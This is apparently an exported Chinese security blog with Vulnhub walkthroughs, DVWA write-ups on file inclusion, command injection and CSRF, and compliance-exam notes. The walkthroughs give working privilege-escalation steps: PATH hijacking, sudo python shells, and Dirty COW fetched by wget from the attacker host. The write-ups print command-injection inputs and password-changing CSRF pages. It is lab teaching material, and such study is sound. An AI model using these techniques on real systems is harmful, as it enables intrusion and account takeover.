&#x2F;&#x2F;同msfvenom生成反弹shell代码中设置的lport  \nrun  在浏览器访问 http://192.168.228.128/upload/msfshell.phtml，getshell成功，升级为交互式shell：登录用户www-data权限较低，没有获取到什么信息。\n\n这里我尝试过使用一句话木马+蚁剑连接进入shell，但蚁剑的shell没法进行后面的export PATH，不知道是为什么？  \n\n\n4.提权\n\n2021-12-01发布的提权相关文章提权  \n\ncat /etc/passwd | grep /bin/bash发现三个用户root、darkhole和john，去darkhole的工作路径 /home/darkhole下没有发现什么。去john的工作路径 /home/john下ls -la查看，发现password、user.txt、file.py和toto文件，password、user.txt和file.py都没有权限，故从toto文件入手，发现toto文件具有s权限（设置使文件在执行阶段具有文件所有者的权限，相当于临时拥有文件所有者的身份。）：  \n./toto 执行toto文件，发现是以john身份执行的一个id命令，故使用劫持环境变量提权：1-在/tmp创建一个id命令文件并赋权：echo &quot;/bin/bash&quot;&gt;/tmp/id &amp;&amp; chmod 777 /tmp/id2-把当前/tmp目录添加到环境变量PATH：export PATH=/tmp:$PATH3-执行toto文件：./toto新增的环境变量目录会添加在$PATH最前(左)端，执行id命令的时候会优先从当前目录下查找程序，所以id命令会被劫持（期望执行的是id，但实际执行的是被写入path的id文件中的命令）。拿到john的shell：cat password拿到密码root123。cat user.txt拿到flagDarkHole{You_Can_DO_It}。以john身份想进入 /root还是权限不够，还需进一步提权。整理一下现在得到的信息，三个用户root、john和darkhole，一个密码root123。这里有两个途径提升到root权限：(1)以john进行sudo提权：  \n\nsudo -l查看发现john有对 /home/john/file.py执行python3的sudo权限。echo &quot;import os;os.system(&#39;/bin/bash&#39;)&quot;&gt;/home/john/file.py将python的getshell代码写入/home/john/file.py。sudo python3 /home/john/file.py执行file.py。   \n\n(2)利用darkhole进行提权：  \n\nsu darkhole切换账户，输入密码root123（经过尝试john和darkhole都能使用这个密码）sudo -l查看发现darkhole具有的sudo权限为 (ALL:ALL)，故此出可以直接使用sudo -i命令进行提权。sudo -i：Linux终端命令下改变用户对命令使用权限的命令，获得的是root用户的环境。sudo -s：执行环境变量中的 SHELL 所指定的 shell，或是 /etc/passwd 里所指定的 shell 。获得的是本身用户的环境。  \n\n拿到root的shell后 cat /root/root.txt 拿flagDarkHole{You_Are_Legend}。 \n\n","categories":["渗透测试"],"tags":["Vulnhub","提权","劫持环境变量提权","FileUpload"]},{"title":"Vulnhub|Sumo","url":"/3a00fd33.html","content":"0.靶机安装\n不再赘述，可看之前的Vulnhub相关文章。  \n\n1.信息收集\nnmap扫描nmap -sn 192.168.xxx.0/24发现目标主机ip。nmap -sS -Pn -A -p- -n 192.168.117.142扫一下详细信息，发现启用了22和80端口。  \n\n2.(80端口)Web\nnikto -h 192.168.117.142扫一下目录和详细信息，发现 /cgi-bin/test目录可能存在漏洞CVE-2014-6278：  \n\n3.getshell\n\n2021-12-03发布的getshell相关文章getshell   \n\n用msfconsole搜一下expsearch CVE-2014-6278。找到一个cgi相关exp use exploit/multi/http/apache_mod_cgi_bash_env_exec。查看需要进行的配置show options，设置目标ipset rhost &lt;目标ip&gt; 和 可能存在漏洞的uri  set targeturi /cgi-bin/test。run，getshell成功，用python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;转成交互式shell。当前用户www-data没有什么权限。  \n\n4.提权\n\n2021-12-01发布的提权相关文章提权  \n\n尝试sudo、suid、写入/etc/passwd和利用cron*都无法提权。lsb_release -a和uname -a查看一下靶机系统内核，是2012年的Linux系统。现在想办法把脏牛漏洞扫描器dirtycowscan.sh传到靶机上，由于不知道具有ssh登录权限的账户密码，这里用wget的方法上传。把脏牛漏洞扫描器dirtycowscan.sh放进攻击机kali的 /vat/www/html目录下，service apache2 restart重启攻击机kali的apache服务。现在在靶机的shell上应可以通过wget http://&lt;攻击机ip&gt;/&lt;目标文件path&gt;来下载目标文件。\n\n但此处要特别注意，当前靶机shell上的用户是www-data，在很多文件夹下都没有写权限，所以会出现下载失败的情况。  \n\n所以在靶机shell上需要先切换到 /tmp目录，再wget http://192.168.117.128/dirtycowscan.sh才能成功下载dirtycowscan.sh。chmod +x dirtycowscan.sh 在靶机上给dirtycowscan.sh赋权（需要执行），./dirtycowscan.sh -s执行脏牛漏洞扫描器，系统IS vulnerable存在脏牛提权漏洞。通过g++ -V和gcc -V查看靶机编译环境，发现有C语言的编译环境。在攻击机上searchsploit dirty，找到合适的exp脚本，在靶机上同样用wget的方法把exp脚本下载下来。   \ncat &lt;exp脚本文件&gt; | grep gcc //查看c源代码的编译命令gcc -pthread 40839.c -o dirty -lcrypt //编译→生成编译文件dirty./dirty //运行  \n按照提示输入自定义密码，程序会用这个自定义密码生成一个具有root权限的用户，再将这个用户写入并替换靶机的/etc/passwd。脚本程序运行结束后，回到靶机www-data用户的shell，通过su切换具有root权限的用户，输入刚才在脚本程序运行过程中自定义的密码，即可提权成功。cat /root/root.txt进入root目录拿flag：{Sum0-SunCSR-2020_r001}。  \n\n","categories":["渗透测试"],"tags":["Vulnhub","提权","脏牛提权","Metasoploit","searchsploit"]},{"title":"Vulnhub|Lampiao","url":"/9f3820f2.html","content":"0.靶机安装\n不再赘述，可看之前的Vulnhub相关文章。  \n\n1.信息收集\nnmap扫描nmap -sn 192.168.xxx.0/24发现目标主机ip。nmap -sS -Pn -A -p- -n 192.168.117.141扫一下详细信息。靶机开放了22(ssh)、80(http)和1898(http)端口。  \n\n2.(80、1898)Web\n由1.信息收集可知80端口没有什么内容，1898端口下有很多目录，主要从1898端口下手。访问http://192.168.117.141:1898/CHANGELOG.txt，获得版本信息Drupal 7.54, 2017-02-01。  \n\n3.getshell\n\n2021-12-03发布的getshell相关文章getshell   \n\n用msf找一下exp msf5&gt; search drupal。设置好所需条件-run，getshell成功，通过python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;转成交互式shell。cat /etc/passwd 发现用户tiago:查看了tiago的工作目录 /html/tiago 和其他关键目录 /var/html，都没有发现什么。一般网站有数据库的配置文件，尝试查找下drupal网站的配置信息。在sites目录下的默认配置文件default中有setting.php。cat /var/www/html/sites/default/setting.php，找到数据库名drupal、数据库用户drupaluser和密码Virgulino。mysql -u drupaluser -p登录数据库。查看users表，tiago的密码无法解码。直接用账户tiago和密码Virgulino尝试ssh登录，成功。浏览了系统，没有发现什么。www-data和tiago都进不去 /root。\n\n4.提权\n\n2021-12-01发布的提权相关文章提权  \n\n尝试sudo、suid、写入/etc/passwd和利用cron*都无法提权。lsb_release -a和uname -a查看靶机内核。由于已经知道了可ssh登录的账号tiago和密码Virgulino，故可尝试脏牛提权。scp /root/tools/scan-dirtycow-master/dirtycowscan.sh tiago@192.168.117.141:/home/tiago将脏牛漏洞扫描器传到靶机上。在靶机运行扫描脚本，显示存在漏洞。在攻击机上searchsploit dirty，同样用scp上传到靶机：在靶机查看刚才上传的exp文件vim 40847.cpp，文件内会给出编译命令g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil，执行编译命令，形成编译文件dcow，./dcow -s运行dcow，提权成功。拿到root权限后，进入 /root，找到flag.txt，获得flag。\n\n","categories":["渗透测试"],"tags":["Vulnhub","提权","脏牛提权","Metasoploit","searchsploit"]},{"title":"DVWA|FileInclusion","url":"/4d5d77bb.html","content":"0.漏洞原理\nFile Inclusion：文件包含（漏洞），是指当服务器开启allow_url_include选项时，就可以通过php的某些特性函数（include()，require()和include_once()，require_once()）利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。服务器通过php的特性（函数）去包含任意文件时，由于要包含的这个文件来源过滤不严，从而可以去包含一个恶意文件，而我们可以构造这个恶意文件来达到自己的目的。  \n\n服务器包含文件时，不管文件后缀是否是php，都会尝试当做php文件执行，如果文件内容确为php，则会正常执行并返回结果，如果不是，则会原封不动地打印文件内容，所以文件包含漏洞常常会导致任意文件读取与任意命令执行。  \n该漏洞涉及到php常见包含文件函数包括：\n\ninclude()：当使用该函数包含文件时，只有代码执行到include()函数时才将文件包含进来，发生错误时只给出一个警告，继续向下执行。  \ninclude_once()：功能和include()相同，区别在于当重复调用同一文件时，程序只调用一次。  \nrequire()：require()与include()的区别在于require()执行如果发生错误，函数会输出错误信息，并终止脚本的运行。使用require()函数包含文件时，只要程序一执行，立即调用文件，而include()只有程序执行到函数时才调用.require()在php程序执行前执行，会先读入require所指定引入的文件，使它变成PHP程序网页的一部分。  \nrequire_once()：它的功能与require()相同，区别在于当重复调用同一文件时，程序只调用一次。  \n\n\n\n\n\n1.Low_level1.1 尝试攻击\n当点击file1时，跳转的url为http://localhost/DVWA-master/vulnerabilities/fi/?page=file1.php，将参数file1.php改为```../../php.ini```：![avatar][img1]成功查看服务器php.ini文件。\n\n可以看到magic_quote_gpc=off，PHP4.0及以上版本中，该选项默认开启；PHP5.4之后的版本已删除该选项。在小于PHP5.3.4的服务器中，magic_quote_gpc=off时，可以在文件名中使用%00截断（%00后的内容不会被识别，可借此绕过某些过滤规则）。  \n\n在远程服务器上传一个phpshell.txt文件：![avatar][img2]\n\n","categories":["渗透测试"],"tags":["DVWA","FileInclusion"]},{"title":"DVWA|CommandInjection","url":"/b9aee5c3.html","content":"0.漏洞原理\n在操作中系统中 &amp;、&amp;&amp;、|、|| 都可以作为命令连接符使用，用户通过浏览器提交执行命令，由于服务端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令。&amp;&amp;和&amp;的区别在于，&amp;&amp;是执行完前面的命令然后执行后面的命令，&amp;是不管前面的命令是否值执行，后面的都执行。  \n\n1.Low_level1.1 尝试注入\n在ip地址后输入&amp;ipconfig：  \n\n1.2 源代码\n&lt;?php \nif(isset($_POST['Submit'])) &#123;\n   // Step1 代码接收用户输入的ip  \n   $target = $_REQUEST['ip'];   \n   // Step2 根据操作系统的区别，对接收ip执行命令不同的ping操作\n   if(stristr(php_uname('s'),'Windows NT'))&#123;\n       //Windows\n       $cmd = shell_exec('ping'.$target);\n   &#125;\n   else&#123;\n       //*nix\n       $cmd = shell_exec('ping -c 4'.$target);\n   &#125;\n   // Final 反馈结果没有进行任何过滤或限制\n   $html .= \"&lt;pre>&#123;$cmd&#125;&lt;/pre>\";\n&#125;\n?>\n\n2.Medium_level2.1 尝试注入\n在ip地址后输入&amp;ipconfig：  \n\n2.2 源代码\n&lt;?php\nif (isset($_POST['Submit']))&#123;\n   // Step1 代码接收用户输入的ip  \n   $target = $_REQUEST['ip'];\n   // Step2 设置过滤列表  \n   $subtitutions = array(\n       '&amp;&amp;' => '', //过滤了'&amp;&amp;'  \n       ';' => '', //过滤了';'  \n   );\n   // Step3 将接收到的输入中与过滤列表匹配的字符过滤  \n   $target = str_replace(array_keys($substitutions),$substitutions,$target);\n   // Step4 根据操作系统的区别，对接收ip执行命令不同的ping操作\n   if(stristr(php_uname('s'),'Windows NT'))&#123;\n       //Windows\n       $cmd = shell_exec('ping'.$target);\n   &#125;\n   else&#123;\n       //*nix\n       $cmd = shell_exec('ping -c 4'.$target);\n   &#125;\n   // Final 过滤列表之过滤了\"&amp;&amp;\"和\";\"，可以使用其他命令字符注入  \n   $html .= \"&lt;pre>&#123;$cmd&#125;&lt;/pre>\";\n&#125;\n?>\n\n3.High_level3.1 尝试注入\n在ip地址后输入|ipconfig：  \n\n3.2 源代码\n&lt;?php \nif (isset($_POST['Submit']))&#123;\n   // Step1 代码接收用户输入的ip  \n   $target = $_REQUEST['ip'];\n   // Step2 设置过滤列表  \n   $subtitutions = array(\n       '&amp;' => '',\n       '&amp;&amp;' => '',   \n       ';' => '', \n       '| ' => '', //仔细看这里过滤的是'| ',意味着'|'仍可利用\n       '-' => '',\n       '$' => '',\n       '(' => '',\n       ')' => '',\n       '`' => '',\n       '||' => '',\n   );\n   // Step3 将接收到的输入中与过滤列表匹配的字符过滤  \n   $target = str_replace(array_keys($substitutions),$substitutions,$target);\n   // Step4 根据操作系统的区别，对接收ip执行命令不同的ping操作\n   if(stristr(php_uname('s'),'Windows NT'))&#123;\n       //Windows\n       $cmd = shell_exec('ping'.$target);\n   &#125;\n   else&#123;\n       //*nix\n       $cmd = shell_exec('ping -c 4'.$target);\n   &#125;\n   // Final High等级的过滤列表比Medium增加了字符    \n   $html .= \"&lt;pre>&#123;$cmd&#125;&lt;/pre>\";\n?>\n\n4.Impossible_level4.1 源代码\n&lt;?php\nif(isset($_POST['Submit']))&#123;\n   checkToken($_REQUEST['user_token'],$_SESSION['session_token'],'index.php');//加入了Anti-CSRF Token\n   $target = $_REQUEST['ip'];\n   $target = stripslashes($target); //该函数会删除字符串string中的反斜杠，返回已剥离反斜杠的字符串。  \n   $octet = explode(\".\",$target); //该函数把字符串打散为数组，返回字符串的数组。参数separator规定在哪里分割字符串，参数string是要分割的字符串，可选参数limit规定所返回的数组元素的数目。  \n   if((is_numeric($octet[0]))&amp;&amp;(is_numeric($octet[1]))&amp;&amp;(is_numeric($octet[2]))&amp;&amp;(is_numeric($octet[3]))&amp;&amp;(sizeof($octet)==4))&#123; //检测string是否为数字或数字字符串，如果是返回TRUE，否则返回FALSE。  \n       $target = $octet[0].'.'.$octet[1].'.'.$octet[2].'.'.$octet[3];//只有[int.int.int.int]格式的输入才执行\n       if(stristr(php_uname('s'),'Windows NT'))&#123;\n           $cmd = shell_exec('ping'.$target);\n       &#125;\n       else&#123;\n           $cmd = shell_exec('ping -c 4'.$target);\n       &#125;\n       $html .= \"&lt;pre>&#123;$cmd&#125;&lt;/pre>\";\n   &#125;\n   else&#123;\n       $html .= '&lt;pre>ERROR:You have entered an incalid IP.&lt;/pre>';\n   &#125;\n   \n&#125;\ngenerateSessionToken();\n?>\n\n","categories":["渗透测试"],"tags":["DVWA","CommandInjection"]},{"title":"DVWA|CSRF","url":"/18030393.html","content":"0.漏洞原理\n\n一个讲的很好的博客推荐阅读:浅谈CSRF攻击方式\n\n\n1.Low_level1.1 尝试攻击\n获取修改密码时使用的url，将url改造为自己需要密码，直接点击url，没有验证身份也可成功修改密码。构造攻击csrf_low.html页面：&lt;img src=\"http://192.168.117.129/dvwa/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change#\" border=\"0\" style=\"display:none;\"/>\n&lt;h1>404&lt;h1>\n&lt;h2>file not found.&lt;h2>  访问csrf_low.html后，退出DVWA重新登录，可以使用密码123456登录。   \n\n1.2 源代码\n&lt;?php\nif( isset( $_GET[ 'Change' ] ) ) &#123;\n// Get input \n$pass_new  = $_GET[ 'password_new' ];\n$pass_conf = $_GET[ 'password_conf' ];\n// Do the passwords match?\nif( $pass_new == $pass_conf ) &#123;// 校验pass_new是否等于pass_conf\n\t// They do! \n\t$pass_new = ((isset($GLOBALS[\"___mysqli_ston\"]) &amp;&amp; is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"],  $pass_new ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\"));\n\t$pass_new = md5( $pass_new );\n\t// Update the database 更新密码\n\t$insert = \"UPDATE `users` SET password = '$pass_new' WHERE user = '\" . dvwaCurrentUser() . \"';\";\n\t$result = mysqli_query($GLOBALS[\"___mysqli_ston\"],  $insert ) or die( '&lt;pre>' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre>' );\n\t// Feedback for the user\n\t$html .= \"&lt;pre>Password Changed.&lt;/pre>\";\n&#125;\nelse &#123;\n\t// Issue with passwords matching\n\t$html .= \"&lt;pre>Passwords did not match.&lt;/pre>\";\n&#125;\n((is_null($___mysqli_res = mysqli_close($GLOBALS[\"___mysqli_ston\"]))) ? false : $___mysqli_res);\n&#125;\n?>\n\n2.Medium_level2.1 尝试攻击\n用Low_level的攻击方式进行尝试，访问攻击页面csrf_low.html后无法成功修改密码：先看一下源代码。\n\n2.2 源代码\n&lt;?php\nif( isset( $_GET[ 'Change' ] ) ) &#123;\n// 加上了对用户请求头的中的Referer字段进行验证,即用户的请求头中的Referer字段必须包含了服务器的名字。\nif( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false ) &#123;\n\t// Get input\n\t$pass_new  = $_GET[ 'password_new' ];\n\t$pass_conf = $_GET[ 'password_conf' ];\n\t// Do the passwords match?\n\tif( $pass_new == $pass_conf ) &#123;\n\t\t// They do!\n\t\t$pass_new = ((isset($GLOBALS[\"___mysqli_ston\"]) &amp;&amp; is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"],  $pass_new ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\"));\n\t\t$pass_new = md5( $pass_new );\n\t\t// Update the database\n\t\t$insert = \"UPDATE `users` SET password = '$pass_new' WHERE user = '\" . dvwaCurrentUser() . \"';\";\n\t\t$result = mysqli_query($GLOBALS[\"___mysqli_ston\"],  $insert ) or die( '&lt;pre>' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre>' );\n\t\t// Feedback for the user\n\t\t$html .= \"&lt;pre>Password Changed.&lt;/pre>\";\n\t&#125;\n\telse &#123;\n\t\t// Issue with passwords matching\n\t\t$html .= \"&lt;pre>Passwords did not match.&lt;/pre>\";\n\t&#125;\n&#125;\nelse &#123;\n\t// Didn't come from a trusted source\n\t$html .= \"&lt;pre>That request didn't look correct.&lt;/pre>\";\n&#125;\n((is_null($___mysqli_res = mysqli_close($GLOBALS[\"___mysqli_ston\"]))) ? false : $___mysqli_res);\n&#125;\n?>\n\n2.3 再次尝试攻击\n通过源代码可知，程序校验了请求报文中的Referer，表示来源地址，防止了从不知名页面的跳转。fiddler抓包，对比发现成功修改密码与失败的请求报文的区别，二者Referer不同：可以通过编辑 .html 文件名，来使 Referer 参数包含服务器ip地址：【192.168.117.129_csrf_medium.html】访问http://172.16.0.166/192.168.117.129_csrf_medium.html，fiddler抓包显示修改密码成功。  \n\n3.High_level3.1 源代码\n&lt;?php\nif( isset( $_GET[ 'Change' ] ) ) &#123;\n// 反CSRF的验证token机制，服务器收到token后，会首先检查token，只有token正确，才会继续处理客户端的请求。\ncheckToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );\n// Get input\n$pass_new = $_GET[ 'password_new' ];\n$pass_conf = $_GET[ 'password_conf' ];\n// Do the passwords match?\nif( $pass_new == $pass_conf ) &#123;\n// They do!\n$pass_new = ((isset($GLOBALS[\"___mysqli_ston\"]) &amp;&amp; is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $pass_new ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\"));\n$pass_new = md5( $pass_new );\n// Update the database\n$insert = \"UPDATE `users` SET password = '$pass_new' WHERE user = '\" . dvwaCurrentUser() . \"';\";\n$result = mysqli_query($GLOBALS[\"___mysqli_ston\"], $insert ) or die( '&lt;pre>' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre>' );\n// Feedback for the user\necho \"&lt;pre>Password Changed.&lt;/pre>\";\n&#125;\nelse &#123;\n// Issue with passwords matching\necho \"&lt;pre>Passwords did not match.&lt;/pre>\";\n&#125;\n((is_null($___mysqli_res = mysqli_close($GLOBALS[\"___mysqli_ston\"]))) ? false : $___mysqli_res);\n&#125;\n// 每次用户修改密码时，服务器会返回随机的token。（下一次请求需要的token隐藏在这一次响应的报文中）\ngenerateSessionToken();\n?>\n\n3.2 尝试攻击\n正常修改密码抓包发现，请求头中多了一个user_token参数，在响应报文中找到下一次请求需要的user_token：构造攻击csrf_high.html页面：&lt;img src=\"http://192.168.117.129/dvwa/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change&amp;user_token=199422ab6cb786bf4f14219bbc82bea5#\" border=\"0\" style=\"display:none;\"/>\n&lt;h1>404&lt;h1>\n&lt;h2>file not found.&lt;h2>访问csrf_high.html后，修改密码成功。  \n\n4.Impossible_level4.1 源代码\n&lt;?php\nif( isset( $_GET[ 'Change' ] ) ) &#123;\n// Check Anti-CSRF token\ncheckToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );\n// Get input\n$pass_curr = $_GET[ 'password_current' ];\n$pass_new = $_GET[ 'password_new' ];\n$pass_conf = $_GET[ 'password_conf' ];\n// Sanitise current password input\n$pass_curr = stripslashes( $pass_curr );\n$pass_curr = ((isset($GLOBALS[\"___mysqli_ston\"]) &amp;&amp; is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $pass_curr ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\"));\n$pass_curr = md5( $pass_curr );\n// Check that the current password is correct\n$data = $db->prepare( 'SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;' );\n$data->bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR );\n$data->bindParam( ':password', $pass_curr, PDO::PARAM_STR );\n$data->execute();\n// Do both new passwords match and does the current password match the user?\nif( ( $pass_new == $pass_conf ) &amp;&amp; ( $data->rowCount() == 1 ) ) &#123;\n// It does!\n$pass_new = stripslashes( $pass_new );\n$pass_new = ((isset($GLOBALS[\"___mysqli_ston\"]) &amp;&amp; is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $pass_new ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\"));\n$pass_new = md5( $pass_new );\n// Update database with new password\n$data = $db->prepare( 'UPDATE users SET password = (:password) WHERE user = (:user);' );\n$data->bindParam( ':password', $pass_new, PDO::PARAM_STR );\n$data->bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR );\n$data->execute();\n// Feedback for the user\necho \"&lt;pre>Password Changed.&lt;/pre>\";\n&#125;\nelse &#123;\n// Issue with passwords matching\necho \"&lt;pre>Passwords did not match or current password incorrect.&lt;/pre>\";\n&#125;\n&#125;\n// Generate Anti-CSRF token\ngenerateSessionToken();\n?>\n\nPDO技术防御SQL注入，PHP 数据对象（PDO） 扩展为PHP访问数据库定义了一个轻量级的一致接口。实现 PDO 接口的每个数据库驱动可以公开具体数据库的特性作为标准扩展功能。也就是采用了预处理的方式将运行语句与参数隔离。  \n防护CSRF，则要求用户输入原始密码（简单粗暴），前提是协议传输没有问题，攻击者在不知道原始密码的情况下，无论如何都无法进行CSRF攻击。\n\n\n","categories":["渗透测试"],"tags":["DVWA","CSRF"]},{"title":"“差异”题","url":"/e0b816a7.html","content":"三级与二级的差异\nQ:《基本要求》中，在应用安全层面的访问控制要求中，三级系统较二级系统增加的措施有哪些？A:1）应由授权主体配置访问控制策略，访问控制策略规定主体对客体的访问规则。2）访问控制的粒度应达到主体为用户级或进程级，客体为文件、数据库表级。3）应对重要的主体和客体设置安全标记，并控制主体对有安全标记的信息资源的访问。\n\n\nQ:二级中，应根据会话状态信息数为数据流提供明确的允许或拒绝访问能力，控制粒度为网段级？A:正确  \n\n《基本要求》/安全区域边界/访问控制：三级应对进出网络的数据流实现基于应用协议和应用内容的访问控制。\n三级为端口级，二级为网段级。  \n\n\n\nQ:应用层软件软件的容错，三级比二级多了什么要求？A:应提供自动保护功能，当故障发生时自动保护当前所有状态，保证系统能够进行恢复。  \n\n《基本要求》/安全计算环境/数据备份与恢复(三级与二级的差异)：应提供异地实时备份功能，利用通信网络将重要数据实时备份至备份场地。应提供重要数据处理系统的热冗余，保证系统的高可用性。\n\n\n等保2.0与1.0的差异\nQ:等保1.0和等保2.0的区别？A:    \n\n\n\n等保\n2.0\n1.0\n\n\n\n\n名称\n《信息安全技术网络安全等级保护基本要求》\n《信息安全技术系统安全等级保护基本要求》\n\n\n定级对象\n信息系统、基础信息网络、云计算平台、大数据平台、物联网系统、工业控制系统、采用移动互联技术的网络等\n信息系统\n\n\n安全要求\n安全通用要求与安全扩展要求\n安全要求\n\n\n措施分类结构变化\n技术： 安全物理环境、安全通信网络、安全区域边界、安全计算环境、安全管理中心 管理： 安全管理制度、安全管理机构、安全管理人员、安全建设管理、安全运维管理\n技术： 物理安全、网络安全、主机安全、应用安全、数据安全 管理： 安全管理制度、安全管理机构、人员安全管理、系统建设管理、系统运维管理\n\n\n内容变化\n定级-备案-建设整改-等级测评-监督检查+新的安全要求(风险评估、安全监测、通报预警、态势感知等)\n定级-备案-建设整改-等级测评-监督检查\n\n\n\n\n其他\nQ:IDS和IPS的区别？A: IDS的工作模式为杂合模式，使用SPAN技术侧挂在主干上，单独工作能够检测但无法抵御；IPS的工作模式为在线模式，直接部署在主干上，根据流量策略，单独工作能够检测并抵御异常流量。   \n\n\nQ:HIDS和NIDS的区别？A: \n\n\n\n项目\nHIDS\nNIDS\n\n\n\n\n系统部署与维护\n与网络拓扑无关（直接安装在系统主机中）\n与网络拓扑相关\n\n\n检测特征\n事件与信号分析\n特征代码分析\n\n\n安全策略\n基本安全策略（点策略）\n运行安全策略（线策略）\n\n\n安全局限\n到达主机的所有事件\n传输中的非加密非保密信息\n\n\n安全隐患\n违规事件\n攻击方法或手段\n\n\n\n\n","categories":["等保测评/初级考试"],"tags":[]},{"title":"命令相关题目","url":"/8c54db8b.html","content":"网络设备路由器/交换机1.身份鉴别\n1.1 应对登录的用户进行身份标识和鉴别，身份标识具有唯一性，身份鉴别信息具有复杂度要求并定期更换。    \n\n\n\n设备/命令\n注释\n预期\n\n\n\n\nCisco/show run\n身份认证、用户口令配置\n存在”username x privilege x password x…”\n\n\nCisco/show run\n身份认证配置\n启用AAA服务器”aaa authentication login/enable…”\n\n\n华为、H3C/display current-configuration\n身份认证、用户口令配置\n存在”local-user x password irreversible-cipher…”\n\n\nH3C/display password-control\n用户口令配置\n存在”password-control aging/length/history…”\n\n\nCisco/enable secret 或 enable password\n特权用户设置口令\n\n\n\n1.2 应具有登陆失败处理功能，应配置并启用结束会话、限制非法登录次数和当登录连接超时自动退出等相关措施。  \n\n\n\n设备/命令\n注释\n预期\n\n\n\n\nH3C/display password-control\n登陆一定次数后进行账户锁定\n存在”password-control login-attempt x exceed locktime x”\n\n\nCisco/华为\n连续登录5次即锁定10分钟\n\n\n\nCisco/show run\n超时断连\n“exec-timeout x”\n\n\n华为/display current-configuration\n超时断连\n“idle-timeout x”\n\n\n\n1.3 当进行远程管理时，应采取必要措施防止鉴别信息在网络传输过程中被窃听。  \n\n\n\n设备/命令\n注释\n预期\n\n\n\n\nCisco/show run\n使用SSH\n“ip ssh time-out x;ip ssh authentication-retries x;transport input ssh…”\n\n\n华为、H3C/display current-configuration\n\n“service-type ssh level x;ssh user x authentication-type x;protocal inbound ssh…”\n\n\n\n1.4 应采用双因子认证。    \n\n2.访问控制\n2.1 应对登录的用户分配账户的权限。  \n2.2 应重命名或删除默认账户，修改默认账户的默认口令。  \n\n\n\n设备\n默认账户：口令\n预期\n\n\n\n\nCisco\ncisco：cisco\n默认账户被删除或重命名，默认口令被修改\n\n\nCisco\nCisco：cisco\n\n\n\n华为\nadmin：admin\n\n\n\n华为\nhuawei：admin@huawei.com\n\n\n\n2.3 应及时删除或停用多余的、过期的账户，避免共享账户的存在。  \n\n\n\n设备/命令\n注释\n预期\n\n\n\n\nCisco/show run\n身份认证配置\n“username x privilege x password x…”都是必要的\n\n\n华为、H3C/display current-configuration\n\n“local-user x privilege level x…”都是必要的\n\n\n\n2.4 管理用户权限分离&amp;最小权限原则。  \n\n\n\n设备/命令\n注释\n预期\n\n\n\n\nCisco/show run\n身份认证配置\n“username x privilege x password x…”各用户权限分离且最小\n\n\n华为/H3C：display current-configuration\n\n“local-user x privilege level x…”各用户权限分离且最小\n\n\n\n【不适用】2.5 应由授权主体配置访问控制策略，访问控制策略规定主体对客体的访问规则。【不适用】2.6 访问控制的粒度达到主体为用户级或进程级，客体为文件、数据库表级。【不适用】2.7 应对重要主体和客体设置安全标记，并控制主体对有安全标记信息资源的访问。    \n\n3.安全审计\n3.1 应启用安全审计功能，审计覆盖到每个用户，对重要的用户行为和重要安全事件进行审计。  \n\n\n\n设备/命令\n注释\n预期\n\n\n\n\nCisco/show run\n审计日志\n“logging on;logging trap debugging;loging x.x.x.x;service timestamps log datetime…”\n\n\n华为/H3C：display current-configuration\n\nInfo-center enable;…Snmp-agent…”\n\n\n\n3.2 审计记录应包括事件的日期和时间、用户、事件类型、时间是否成功及其他与审计相关的信息。3.3 应对审计记录进行保护，定期备份，避免受到未预期的删除、修改或覆盖等。3.4 应对审计进程进行保护，防止未经授权的中断。    \n\n4.入侵防范\n【不适用】4.1 应遵循最小安装的原则，仅安装需要的组件和应用程序。4.2 应关闭不需要的系统服务、默认共享和高危端口。  \n\n\n\n设备/命令\n注释\n预期\n\n\n\n\nCisco/sh running\n实际网络环境配置\n“no service x;no x run;no ip x…”\n\n\n华为/H3C：display current-configuration\n\n“ip x shutdown…”\n\n\n\n4.3 应通过设定终端接入方式或网络地址范围对通过网络进行管理的管理终端进行限制。  \n\n\n\n设备/命令\n注释\n预期\n\n\n\n\nCisco/show run\n访问控制列表\n“access-list x permit/deny 